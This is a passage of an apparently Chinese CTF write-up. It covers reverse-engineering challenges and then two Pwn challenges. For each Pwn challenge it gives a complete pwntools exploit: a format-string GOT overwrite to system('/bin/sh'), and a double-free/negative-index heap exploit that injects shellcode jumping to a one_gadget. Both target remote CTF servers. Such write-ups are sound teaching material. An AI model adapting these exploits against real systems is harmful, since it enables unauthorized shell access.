第一块
比较这几个位置
第二块
就是以{_}三个字符为分隔符，判断每个部分是否合法
第一小块
这里的值看ascii码
第二小块
这个是‘4’
第三小块
就是 MD5
第四小块
Py
register
题目要求默认为flag{}和在一起得到：
flag{th？_4_your_register}
？这里我们不知道，只能去猜
通过猜猜猜，得到
flag{thx_4_your_register}
**0x04 Reverse04**
我们还是看程序逻辑：
有个伪随机，是个固定值，然后过两个函数
函数1
就是个编码上的加密
函数2
也是个编码上的加密
最后加密和“vfnlhthn__bneptls}xlragp{__vejblxpkfygz_wsktsgnv ”这个串相同就对了，这就是程序的逻辑
接着我们进行具体分析：
先看函数2
里面有个rand，Gdb 调出来
V8=8,v9=6；
6*8=48 ，正好和密文数量相同！
然后看里面开始实际是一个交换
除了 {_} 这三个字符都换
函数一里面
第一个循环生成了一个表
第二个是 :表对应位置加上一个数
我们直接把函数二解密的结果 减去那个数
剩下就是还原表里面的数，仔细一看就是个mod26的表，这种我们把小于97的数再加26就行了!
脚本随手写的，解密得到结果：
flag{decrypt_game_is_very_very_interesting}
逻辑分析不难，只要把握好数据的变化，题目的答案就不远了。
**Pwn**
**0x01 Pwn1**
看了下 简单的格式化字符串
简单分析一下吧
Scanf 格式化的字符串直接传值在getchar()里进行判断 导致存在格式化字符串漏洞
这里贴出exp
    #!/usr/bin/env python2
    # -*- coding:utf-8 -*-    from pwn import *
    #switches
    DEBUG = 0
    LOCAL = 0
    VERBOSE = 0
    elf = ELF('./pwn1')
    if LOCAL:
        libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
        p = process('./pwn1')#local processs
    else:
        p = remote('115.28.185.220',11111)
        libc = ELF('libc32.so')
    # simplified r/s function
    def fms(data):
        p.recvuntil('input$')
        p.sendline('1')
        p.recvuntil('name:n')
        p.sendline(data)
    # define interactive functions here
    def pwn():
    #leak libc_base_addr
        fms('%35$p')
        if LOCAL:
        libc_start_main_addr = int(p.recvn(10),16) - 247
        else:
        libc_start_main_addr = int(p.recvn(10),16) - 243
        libc.address = libc_start_main_addr - libc.symbols['__libc_start_main']
        print 'libc.addr => ', hex(libc.address)
        printf_got = elf.got['printf']
        print 'printf_got => ' , hex(printf_got)
    #find printf_addr & system_addr 
        system_addr = libc.symbols['system']
        print 'system_addr => ' , hex(system_addr)
    #make stack
        make_stack = 'a' * 0x30 + p32(printf_got) + p32(printf_got + 0x1) 
        fms(make_stack)
    #write system to printf
        payload = "%" + str(((system_addr & 0x000000FF))) + "x%18$hhn"
        payload += "%" + str(((system_addr & 0x00FFFF00) >> 8) - (system_addr & 0x000000FF)) + "x%19$hn" 
        print payload
    #get shell
        fms(payload)
        p.sendline('/bin/shx00')
        p.interactive()
    # define symbols and offsets here
    if __name__ == '__main__': 
        pwn()
**0x02 Pwn2**
同样先进行分析
这里chunk_number能到48，但是free检测到47，释放掉一个之后 list[45]=list[46]，所以这里存在double free漏洞
这里啰嗦几句吧 这题出的还是有难度的 这里想讲自己错误的思路 然后在分析正确思路
错误思路：
没有开nx 所以bss可任意读写
将chunk_number的值设置成21，然后两次写，最后覆盖到了list，这时在create一个list，应该就能覆盖到got表了
通过fastbin该num进行覆盖 但是因为多了一个0x10会破坏掉堆
认为这里存在任意读 但是发现无法利用
若还是将chunk_number写21然后free(&chunk_number-8),然后 malloc就能进行对chunk_number+8 写内容了
但是却只能写到chunk_number下面
这里可以leak堆地址 但是却无法控制eip 导致死死地卡在这里
正确思路： 前面思路中分析的漏洞点都没有问题 所以这里不再重复
错误的只是思路问题 和利用方式
往got上面写heap地址 然后jmp shellcode
这里也是通过该num 不过这次不是通过double free 而是通过free 一定的负下标
预先在num下面设置好的负数位移到上面的num 下次malloc的时候就可以让got
表的地址填上我们的堆地址
需要用到shellcode 不能改got ，跳转到got表后就会执行got表地址所处的命令
接着进行复写got
看距list的下标是负几 不停的free 就会将写好的负数位移到num那里 再次
Mallco时 list+num处 会填写我申请到的地址
第一步 要申请到bss段 num下面的地址 在里面填上一个合适的负数
此时也可以往堆写入 预先写好的shellcode
接下里思路清晰就可以构造exp了
下面附上代码
    from pwn import *
    local = 0
    slog = 0
    debug = 0
    if slog:context.log_level = 'debug'
    context(arch='amd64')
    if local and debug:
            p = process("./mistake", env={"LD_PRELOAD" : "/mnt/hgfs/share/tool/libc-database/db/libc6_2.19-0ubuntu6.11_amd64.so"})
    else:
            p = remote('115.28.185.220',22222)#115.28.185.220 22222
    libc = ELF('/mnt/hgfs/share/tool/libc-database/db/libc6_2.19-0ubuntu6.11_amd64.so')
    def malloc(content):
        p.recvuntil('> ')
        p.sendline('1')
        p.recvuntil('content: ')
        p.sendline(content)
    def free(id):
        p.sendline('3')
        p.sendline(str(id))
    def read(addr):
        p.sendline('2')
        p.recvuntil('id: ')
        addr = (addr-0x6020a0)/8
        addr = 0x100000000+addr
        p.sendline(str(addr))
    def num(number):
        max = 0xffffffff
        return max + number + 1
    free_got = 0x602018
    chunk_49 =0x602220
    list = 0x6020A0
    ptr_got = 0x601f00
    chunk_number = 0x0602080
    one_offset = 0xe9f2d    
    def pwn():
        #leak libc and one_gadget address 
        read(ptr_got)
        p.recv(32)
        write_addr = u64(p.recv(8))
        libc.address = write_addr - libc.symbols['write']
        one = libc.address + one_offset 
        log.info('write address is ' + hex(write_addr))
        log.info('libc address is ' + hex(libc.address))
        log.info('one_gadget is ' + hex(one))
        #to double free fake num
        p.send('n')
        for x  in xrange(49):
            malloc('AAAA')
        for y in xrange(16):
            free(0)
        free(32)
        free(30)
        free(30)
        malloc(p64(chunk_number-0x8))
        malloc('BBBB')
        malloc('CCCC')
        malloc(p64(num(-13)))
        payload = '''mov rax, {}
                     jmp rax'''.format(one)
        shellcode = asm(payload)
        #change num to neg
        free(num(-5))
        #change malloc got
        malloc(shellcode)
        p.send('1')
    pwn()
    p.interactive()